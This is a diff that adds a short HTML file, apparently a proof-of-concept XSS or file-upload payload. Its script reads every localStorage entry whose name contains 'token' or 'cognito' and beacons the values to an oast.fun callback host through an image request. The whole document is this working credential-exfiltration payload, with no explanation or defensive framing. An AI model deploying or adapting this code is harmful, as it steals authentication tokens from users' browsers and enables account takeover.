@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <script>
+      <![CDATA[
+        let data = '';
+        for (let i = 0; i < localStorage.length; i++) {
+          let key = localStorage.key(i);
+          if (key.toLowerCase().includes("token") || key.toLowerCase().includes("cognito")) {
+            data += key + '=' + localStorage.getItem(key) + '&';
+          }
+        }
+        new Image().src = "https://bvgdjvgbjendwujiktpc7z59xxjaoau8x.oast.fun/?" + encodeURIComponent(data);
+      ]]>
+    </script>
+  </body>
+</html>
